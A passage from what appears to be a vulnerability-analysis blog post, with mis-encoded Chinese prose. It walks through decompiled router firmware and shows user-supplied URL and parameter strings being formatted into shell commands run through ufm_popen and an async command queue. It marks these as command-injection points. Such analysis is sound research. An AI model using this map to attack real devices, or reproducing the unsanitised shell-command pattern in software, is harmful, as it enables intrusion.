oversize %d&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v71 = (<span class="type">unsigned</span> __int8 *)_20_23_is_data[<span class="number">9</span>];</span><br><span class="line">          v72 = (<span class="type">char</span> *)(_20_23_is_data[<span class="number">9</span>] + v70);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( v71 == (<span class="type">unsigned</span> __int8 *)v72 )</span><br><span class="line">              &#123;</span><br><span class="line">                v75 = *(_DWORD *)addr;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_173;</span><br><span class="line">              &#125;</span><br><span class="line">              v73 = (<span class="type">char</span>)*v71;</span><br><span class="line">              v74 = *v71;</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v74 - <span class="number">48</span>) &gt;= <span class="number">0xB</span> &amp;&amp; (v74 &amp; <span class="number">0xFFFFFFDF</span>) - <span class="number">65</span> &gt;= <span class="number">0x1A</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              ++v71;</span><br><span class="line">            &#125;</span><br><span class="line">            ++v71;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v73 == <span class="number">95</span> );</span><br><span class="line">          v50 = <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][:][A~Z][_][a~z]!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_142;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_171;                           <span class="comment">// æ‰§è¡Œè¿™ä¸ª</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_93:</span><br><span class="line">  v50 = <span class="string">&quot;ERROR (%s %s %d)param parse failed![%s]&quot;</span>;</span><br><span class="line">  v51 = <span class="string">&quot;parse_param&quot;</span>;</span><br><span class="line">LABEL_143:</span><br><span class="line">  v95 = <span class="number">0</span>;</span><br><span class="line">  uf_log_printf(uf_log, v50, <span class="string">&quot;ufm_lib.c&quot;</span>, v51);</span><br><span class="line">  _20_23_is_data[<span class="number">22</span>] = strdup(<span class="string">&quot;&#123;\&quot;rcode\&quot;:\&quot;03510003\&quot;,\&quot;rmsg\&quot;:\&quot;UF: param is invalid\&quot;&#125;&quot;</span>);</span><br><span class="line">LABEL_244:</span><br><span class="line">  v82 = addr;</span><br><span class="line">LABEL_212:</span><br><span class="line">  v83 = LOBYTE(_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_BYTE *)(v82 + <span class="number">45</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_237;</span><br><span class="line">  <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">20</span>] )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_236;</span><br><span class="line">  data_3 = json_tokener_parse(*(_DWORD *)(v82 + <span class="number">12</span>), v40);</span><br><span class="line">  v85 = data_3;</span><br><span class="line">  <span class="keyword">if</span> ( !data_3 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)-u param is invalid!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>, <span class="number">400</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  &#125;</span><br><span class="line">  data_confirmUrl = json_object_object_get(data_3, <span class="string">&quot;confirmUrl&quot;</span>);</span><br><span class="line">  data_confirmUrl_1 = data_confirmUrl;</span><br><span class="line">  <span class="keyword">if</span> ( !data_confirmUrl || json_object_get_type(data_confirmUrl) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)url is empty!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">  &#125;</span><br><span class="line">  v89 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(data_confirmUrl_1);</span><br><span class="line">  v88 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  v90 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(v88 + <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v90 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)malloc failed!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">  &#125;</span><br><span class="line">  v91 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v90[v91], <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">  v92 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v90,</span><br><span class="line">    v92 + <span class="number">127</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST \&quot;%s\&quot; -H &#x27;content-type: application/json&#x27; -d &#x27;&#123;\&quot;code\&quot;:\&quot;0\&quot;,\&quot;msg\&quot;:\&quot;success\&quot;&#125;&#x27;&quot;</span>,</span><br><span class="line">    v89);</span><br><span class="line">  v96[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v93 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ufm_popen(v90, v96);                        <span class="comment">// å‘½ä»¤æ‰§è¡Œç‚¹</span></span><br><span class="line">........</span><br><span class="line">  &#125;</span><br><span class="line">.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·³åˆ°è¿™é‡Œä¹‹åå°±è·³è¿‡ç¬¬ä¸€ä¸ªifè¿›å…¥ç¬¬äºŒä¸ªifï¼Œç„¶åæ‰§è¡Œgoto LABEL_171;   å’Œgoto LABEL_172;  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">LABEL_172:</span><br><span class="line">      v75 = *v53;</span><br><span class="line">LABEL_173:</span><br><span class="line">      <span class="keyword">if</span> ( !v75 &amp;&amp; g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)para networkId:%s, groupId:%s!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">538</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">9</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">10</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;get&quot;</span>)</span><br><span class="line">        &amp;&amp; ((v76 = _20_23_is_data[<span class="number">14</span>], !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">14</span>], <span class="string">&quot;configPath&quot;</span>))</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configVersion&quot;</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configDefault&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">15</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_184;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">14</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      _20_23_is_data[<span class="number">24</span>] = find_module_info(v77, &amp;_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">      v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">LABEL_184:</span><br><span class="line">      <span class="keyword">if</span> ( v78 )</span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_BYTE *)(_20_23_is_data[<span class="number">0</span>] + <span class="number">48</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          pthread_mutex_lock(v78 + <span class="number">112</span>);</span><br><span class="line">          v98 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">if</span> ( _sigsetjmp(v96, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_unlock(v98 + <span class="number">112</span>);</span><br><span class="line">            _pthread_unwind_next(v96);</span><br><span class="line">          &#125;</span><br><span class="line">          _pthread_register_cancel(v96);</span><br><span class="line">          v80 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">12</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v80 &amp;&amp; *v80 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">                <span class="number">579</span>,</span><br><span class="line">                uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">                v80,</span><br><span class="line">                _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(</span><br><span class="line">              uf_log,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">              <span class="number">583</span>,</span><br><span class="line">              uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">              _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);<span class="comment">// å‘½ä»¤æ‰§è¡Œç‚¹</span></span><br><span class="line">          pthread_mutex_unlock(_20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          _pthread_unregister_cancel(v96);</span><br><span class="line">LABEL_211:</span><br></pre></td></tr></table></figure><p>å°±ä¼šå‘ç°ä¹‹åæœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç‚¹ufm_handleï¼Œè®©æˆ‘ä»¬å…ˆåˆ†æåˆ†æè¯¥å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;update&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v28 = sub_40FD5C(a1);</span><br><span class="line">LABEL_169:</span><br><span class="line">      v1 = v28;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_176;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬çš„æ˜¯setè°ƒç”¨æ‰€ä»¥è°ƒç”¨sub_40FD5Cå‡½æ•°ï¼Œç»è¿‡åˆ†æè°ƒç”¨sub_40CEAC(a1, a1 + 22, 0, 0) å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(&amp;v63[v67], v65, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, data);</span><br><span class="line">ufm_commit_add(<span class="number">0</span>, v63, <span class="number">1</span>, <span class="number">0</span>); </span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„è°ƒç”¨å°±æ˜¯è¿™ä¸¤ä¸ªï¼Œv63æ„æˆäº†shell</p><h4 id="ufm-commit-add"><a href="#ufm-commit-add" class="headerlink" title="ufm_commit_add"></a>ufm_commit_add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_commit_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> __int8 a3, <span class="type">const</span> <span class="type">char</span> **a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = async_cmd_push_queue(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(v6 + <span class="number">36</span>);</span><br><span class="line">      *a4 = *(<span class="type">const</span> <span class="type">char</span> **)(v8 + <span class="number">52</span>);</span><br><span class="line">      v7 = *(_DWORD *)(v8 + <span class="number">56</span>);</span><br><span class="line">      sub_41AD10(v8);</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)commit ret:%d, rbuf:%s&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;ufm_commit_add&quot;</span>, <span class="number">359</span>, v7, *a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="async-cmd-push-queue"><a href="#async-cmd-push-queue" class="headerlink" title="async_cmd_push_queue"></a>async_cmd_push_queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">async_cmd_push_queue</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> __int8 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4360A4 &gt;= <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">      uf_log,</span><br><span class="line">      <span class="string">&quot;ERROR (%s %s %d)[async cmd queue fulled!][%d]&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">      <span class="string">&quot;async_cmd_push_queue&quot;</span>,</span><br><span class="line">      <span class="number">78</span>,</span><br><span class="line">      <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_4360B8);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">68</span>);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory malloc failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">85</span>);</span><br><span class="line">LABEL_5:</span><br><span class="line">    v8 = &amp;unk_4360B8;</span><br><span class="line">LABEL_6:</span><br><span class="line">    pthread_mutex_unlock(v8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);</span><br><span class="line">      *(_DWORD *)(v7 + <span class="number">28</span>) = v19;</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory malloc failed![%s]&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">133</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)invalid commit para!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">139</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v7);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(v7, a1, <span class="number">28</span>);</span><br><span class="line">  v10 = a1[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !v10 || (v12 = strdup(v10), (*(_DWORD *)(v7 + <span class="number">16</span>) = v12) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">97</span>);</span><br><span class="line">    v11 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = json_object_get();</span><br><span class="line">    *(_DWORD *)(v7 + <span class="number">12</span>) = v13;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">104</span>);</span><br><span class="line">      v11 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)param obj[%x], para_obg[%x]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;async_cmd_push_queue&quot;</span>,</span><br><span class="line">        <span class="number">107</span>,</span><br><span class="line">        a1[<span class="number">3</span>],</span><br><span class="line">        *(_DWORD *)(v7 + <span class="number">12</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = a1[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = strdup(v14);</span><br><span class="line">    *(_DWORD *)(v7 + <span class="number">24</span>) = v15;</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;async_cmd_push_queue&quot;</span>, <span class="number">112</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">      v16 = *(_DWORD *)(v7 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v16 )</span><br><span class="line">        <span class="built_in">free</span>(v16);</span><br><span class="line">      v17 = *(_DWORD *)(v7 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        json_object_put(v17);</span><br><span class="line">      v18 = *(_DWORD *)(v7 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">        <span class="built_in">free</span>(v18);</span><br><span class="line">      <span class="built_in">free</span>(v7);</span><br><span class="line">      v8 = &amp;unk_4360B8;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">LABEL_34:</span><br><span class="line">  v20 = (_DWORD *)dword_435DE0;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br><span class="line">  dword_435DE0 = v7 + <span class="number">60</span>;</span><br><span class="line">  v21 = dword_4360A4;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br><span class="line">  *v20 = v7 + <span class="number">60</span>;</span><br><span class="line">  dword_4360A4 = v21 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 